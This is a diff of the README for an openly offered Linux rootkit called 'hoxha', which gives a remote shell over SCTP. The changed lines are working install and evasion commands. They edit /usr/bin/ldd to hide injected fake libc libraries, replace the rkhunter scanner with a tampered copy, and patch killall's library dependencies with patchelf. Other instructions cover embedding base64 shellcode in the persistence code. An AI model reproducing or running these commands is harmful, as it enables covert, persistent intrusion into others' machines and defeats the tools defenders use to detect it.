@@ -9,13 +9,13 @@ You can download this like so:
 ```
 git clone https://github.com/mephistolist/hoxha.git
 ```
+If you are not on a Debian based system, you will want to run this to change to the name of your python install:
+```
+sed -i 's/python3/python/g' hoxha/persistance/libexec.c 
+```
 Considering SCTP is installed and loaded in the kernel, you can install the rootkit this:
 ```
-cd hoxha && make install clean && cd /persistance && [ -f ./patchelf ] && chmod +x ./patchelf && make install clean && sed -i 's/try_trace \"$RTLD\" \"$file\" || result=1/try_trace \"$RTLD\" \"$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' /usr/bin/ldd && [ -f $(which rkhunter) ]  && cp ./rkhunter $(which rkhunter) 2>/dev/null
-```
-On another device you can build the client with the following in the hoxha root directory:
-```
-cc enver.c -o enver -s -pipe -march=native -O2 -std=gnu17 -Wall -Wextra -pedantic -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident -ffunction-sections -fdata-sections -falign-functions=1 -falign-loops=1 --no-data-sections -falign-jumps=1 -falign-labels=1 -flto -fipa-icf -z execstack -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code -lsctp
+cd hoxha && make install clean && cd persistance && [ -f ./patchelf ] && chmod +x ./patchelf && make install clean && sed -i 's/try_trace \"$RTLD\" \"$file\" || result=1/try_trace \"$RTLD\" \"$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' /usr/bin/ldd && [ -f $(which rkhunter) ]  && cp ./rkhunter $(which rkhunter) 2>/dev/null
 ```
 The client can be used with just the destionation ip address where this rootkit is installed:
 ```
@@ -25,9 +25,9 @@ The client can be used with just the destionation ip address where this rootkit 
 [+] Connected. Type commands (type 'exit' to quit):
 sctp-shell>
 ```
-As SCTP ports are hard to close, I would suggest running this to exit the shell:
+As SCTP ports are hard to close, I would suggest updating this with the paths to where you have the 'hoxha' folder and running this when exiting the shell:
 ```
-killall -9 hoxha && service cron restart
+/home/user/hoxha/persistance/patchelf --remove-needed /lib/x86_64-linux-gnu/libc.so.5 $(which killall) && killall -9 hoxha && systemctl restart cron && /home/user/hoxha/persistance/patchelf --add-needed /lib/x86_64-linux-gnu/libc.so.5 $(which killall)
 ```
 This will ensure that only one port is left listening for future connections.
 
@@ -39,4 +39,4 @@ Then you can base64 the raw data like so:
 ```
 cat shellcode.bin | base64
 ```
-Add that base64 encoded string to the hoxha/persistance/libexec.c file and re-run the Makefile in the persistance folder and your changes should be running.
+Add that base64 encoded string to the hoxha/persistance/libexec.c file and re-run the Makefile in the persistance folder to apply your changes.
